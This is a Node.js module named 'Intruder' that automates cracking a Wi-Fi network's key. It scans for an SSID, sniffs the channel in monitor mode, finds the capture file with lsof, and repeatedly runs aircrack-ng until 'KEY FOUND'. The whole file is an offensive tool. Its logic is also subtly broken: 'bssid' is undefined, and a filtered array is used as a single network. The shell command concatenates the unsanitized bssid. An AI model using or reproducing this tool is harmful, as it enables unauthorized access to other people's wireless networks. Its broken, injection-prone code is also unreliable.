
/**
 * Dependencies.
 */

var EventEmitter = require('events').EventEmitter;
var exec = require('child_process').exec;
var Scanner = require('network-scanner');
var Sniffer = require('network-sniffer');
var lsof = require('lsof');

/**
 * Expose `Intruder`.
 */

module.exports = Intruder;

/**
 * Initialize an `Intruder` with `options`.
 *
 * Options:
 *
 * 	- `interval` the time between crack attempts
 * 	- `channel` the network channel
 *
 * @param {Object} opts
 * @api public
 */

function Intruder(opts) {
  if (!(this instanceof Intruder)) return new Intruder(opts);
  EventEmitter.call(this);
  opts = opts || {};

  this.interval = opts.interval || 2000000;
  this.channel = opts.channel;
}

/**
 * Inherit from `EventEmitter.prototype`.
 */

Intruder.prototype = Object.create(EventEmitter.prototype);

/**
 * Crack the network by ssid.
 *
 * @param {String} ssid
 * @param {Function} done
 * @api public
 */

Intruder.prototype.crack = function(ssid, done) {
  var scanner = Scanner();
  var sniffer = Sniffer();
  var self = this;

  // discover wireless networks
  scanner.scan(function(err, networks) {
    if (err) return done(err, null);

    // find access point by ssid
    var network = networks.filter(function(network) { return network.ssid === ssid });

    // start sniffing channel
    var child = sniffer.start(network.channel);

    // make sure the wireless card does not get stuck in monitor mode
    process.on('exit', function() { sniffer.stop(network.channel) });

    // find capture file
    setTimeout(function() { self.capture(child.pid); }, 1000);

    // decrypt capture file in intervals
    self.intervalId = setInterval(function() { self.decrypt(bssid, done); }, self.interval);
  });
};

/**
 * Find the capture file.
 *
 * @param {String} pid
 * @api public
 */

Intruder.prototype.capture = function(pid) {
  var self = this;

  lsof.raw(pid, function(files) {
    files.forEach(function(file) {
      if (file.name && file.name.indexOf('airportSniff') !== -1) {
        self.target = file.name;
      }
    });
  });
};

/**
 * Decrypt the capture file.
 *
 * @param {String} bssid
 * @param {Function} done
 * @api public
 */

Intruder.prototype.decrypt = function(bssid, done) {
  var self = this;

  exec('aircrack-ng -1 -a 1 -b ' + bssid + ' ' + self.target, function(_, stdout) {
    if (!stdout) return;
    var results = parse(stdout);

    if (results.ivs) {
      self.emit('attempt', results.ivs);
    }

    if (results.success) {
      done(null, results.key);
      clearInterval(self.intervalId);
    }
  });
};

/**
 * Parse stdout for the results.
 *
 * @param {String} stdout
 */

function parse(stdout) {
  var res = {};

  var ivs = stdout.match(/\(got (\d+) IVs\)/);
  if (ivs) res.ivs = ivs[1];

  var key = stdout.match(/KEY FOUND! \[ (.+) \]/);
  if (key) {
    res.key = key[1];
    res.success = true;
  } else {
    res.success = false;
  }

  return res;
}
